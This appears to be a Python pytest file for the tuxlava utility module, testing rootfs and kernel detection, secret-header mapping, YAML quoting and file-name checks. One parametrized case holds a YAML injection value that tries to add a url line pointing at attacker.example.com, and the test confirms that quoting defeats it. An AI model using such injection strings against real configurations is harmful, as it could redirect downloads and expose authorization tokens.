# -*- coding: utf-8 -*-

from argparse import ArgumentTypeError
from pathlib import Path

import pytest
import yaml

from tuxlava.utils import (
    downloaded_name,
    url_name,
    is_cpio_rootfs,
    kernel_type,
    is_plain_file_name,
    notnone,
    pathurlnone,
    secret_headers,
    secret_headers_yaml,
    yaml_quote,
)


def test_is_cpio_rootfs():
    assert is_cpio_rootfs(None) is False
    assert is_cpio_rootfs("") is False

    assert is_cpio_rootfs("https://example.com/rootfs.cpio.gz") is True
    assert is_cpio_rootfs("https://example.com/rootfs.cpio") is True
    assert is_cpio_rootfs("https://example.com/rootfs.ext4.zst") is False

    assert is_cpio_rootfs("https://example.com/ramdisk.img") is True
    assert is_cpio_rootfs("https://example.com/ramdisk/rootfs.ext4.zst") is False


def test_kernel_type():
    assert kernel_type("https://example.com/zImage") == "zimage"
    assert kernel_type("https://example.com/zImage.gz") == "zimage"
    assert kernel_type("https://example.com/zImage.zst") == "zimage"
    assert kernel_type("https://example.com/uImage") == "uimage"
    assert kernel_type("https://example.com/uImage.zst") == "uimage"

    # everything else is an "image", including a bzImage
    assert kernel_type("https://example.com/Image") == "image"
    assert kernel_type("https://example.com/Image.gz") == "image"
    assert kernel_type("https://example.com/bzImage") == "image"
    assert kernel_type("https://example.com/vmlinuz") == "image"

    assert kernel_type(None) == "image"
    assert kernel_type("") == "image"


def test_secret_headers():
    aaa = {"Authorization": "Bearer aaa"}
    bbb = {"Authorization": "Bearer bbb"}

    # no artefact, used on every url from the command line
    assert secret_headers(aaa, {"kernel", "rootfs"}) == {
        "kernel": aaa,
        "rootfs": aaa,
    }

    # a device default keeps no header
    assert secret_headers(aaa, {"kernel"}) == {"kernel": aaa}

    # an artefact key is used even when the url is a device default
    assert secret_headers({"rootfs:Authorization": "Bearer bbb"}, set()) == {
        "rootfs": bbb
    }

    # the artefact wins over the fallback
    secrets = {"Authorization": "Bearer aaa", "rootfs:Authorization": "Bearer bbb"}
    assert secret_headers(secrets, {"kernel", "rootfs"}) == {
        "kernel": aaa,
        "rootfs": bbb,
    }

    # several headers on the same artefact
    secrets = {"PRIVATE-TOKEN": "glpat", "kernel:X-Api-Key": "key"}
    assert secret_headers(secrets, {"kernel"}) == {
        "kernel": {"PRIVATE-TOKEN": "glpat", "X-Api-Key": "key"}
    }

    # avh_api_token is not a header, whatever the case and the artefact
    for key in ["avh_api_token", "AVH_API_TOKEN", "kernel:avh_api_token"]:
        assert secret_headers({key: "token"}, {"kernel"}) == {}

    # an empty value or an empty header name is skipped
    assert secret_headers({"Authorization": ""}, {"kernel"}) == {}
    assert secret_headers({"": "token"}, {"kernel"}) == {}
    assert secret_headers({"kernel:": "token"}, {"kernel"}) == {}


def test_secret_headers_yaml():
    headers = {"kernel": {"Authorization": "Bearer aaa"}}
    assert secret_headers_yaml({}, "kernel", 8) == ""
    assert secret_headers_yaml(headers, "rootfs", 8) == ""
    assert (
        secret_headers_yaml(headers, "kernel", 8)
        == '        headers:\n          "Authorization": "Bearer aaa"\n'
    )


@pytest.mark.parametrize(
    "value",
    [
        'Bearer a"b',
        "Bearer a\\b",
        'x"\n        url: "https://attacker.example.com/steal',
        "åäö",
    ],
)
def test_secret_headers_yaml_quoting(value):
    # The value must stay a value. A '"' or a newline would otherwise end
    # the scalar and write its own yaml.
    text = secret_headers_yaml({"kernel": {"Authorization": value}}, "kernel", 8)
    document = yaml.safe_load('kernel:\n        url: "u"\n' + text)
    assert document["kernel"]["url"] == "u"
    assert document["kernel"]["headers"] == {"Authorization": value}


def test_notnone():
    assert notnone(None, "fallback") == "fallback"
    assert notnone("", "fallback") == ""
    assert notnone("hello", "fallback") == "hello"


def test_pathurlnone():
    assert pathurlnone(None) is None
    assert pathurlnone("https://example.com/kernel") == "https://example.com/kernel"
    assert pathurlnone(__file__) == f"file://{Path(__file__).expanduser().resolve()}"

    with pytest.raises(ArgumentTypeError) as exc:
        pathurlnone("ftp://example.com/kernel")
    assert exc.match("Invalid scheme 'ftp'")

    with pytest.raises(ArgumentTypeError) as exc:
        pathurlnone("file:///should-not-exists")
    assert exc.match("/should-not-exists no such file or directory")


def test_url_name_takes_the_last_part_of_the_path():
    assert url_name("https://e.com/a/b/rootfs.img.xz") == "rootfs.img.xz"


def test_url_name_ignores_the_query():
    # A redirect endpoint. Every image comes back as "download".
    url = "https://drive.usercontent.google.com/download?id=A&confirm=xxx"
    assert url_name(url) == "download"


def test_downloaded_name_drops_the_suffix_we_decompress():
    assert downloaded_name("rootfs.img.xz", "xz") == "rootfs.img"


def test_downloaded_name_keeps_the_suffix_without_compression():
    # No compression key means LAVA saves the file as it is.
    assert downloaded_name("rootfs.img.xz") == "rootfs.img.xz"


def test_downloaded_name_of_a_file_without_a_suffix():
    assert downloaded_name("Image") == "Image"


def test_is_plain_file_name_takes_a_normal_name():
    assert is_plain_file_name("rootfs.img.xz") is True


def test_is_plain_file_name_rejects_a_path():
    assert is_plain_file_name("a/b.img") is False
    assert is_plain_file_name("..") is False


def test_is_plain_file_name_rejects_what_breaks_the_url():
    # LAVA points at the file with downloads://<name>.
    for name in ("fw#1.wic", "fw?1.wic", "fw[1].wic"):
        assert is_plain_file_name(name) is False


def test_yaml_quote_wraps_the_value():
    assert yaml_quote("rootfs.img.xz") == '"rootfs.img.xz"'


def test_yaml_quote_keeps_a_colon_in_the_string():
    assert yaml.safe_load(f"key: {yaml_quote('a: b')}") == {"key": "a: b"}


def test_yaml_quote_keeps_a_hash_in_the_string():
    assert yaml.safe_load(f"key: {yaml_quote('a #1')}") == {"key": "a #1"}


def test_yaml_quote_escapes_a_quote():
    quoted = yaml_quote('a"b')
    assert yaml.safe_load(f"key: {quoted}") == {"key": 'a"b'}
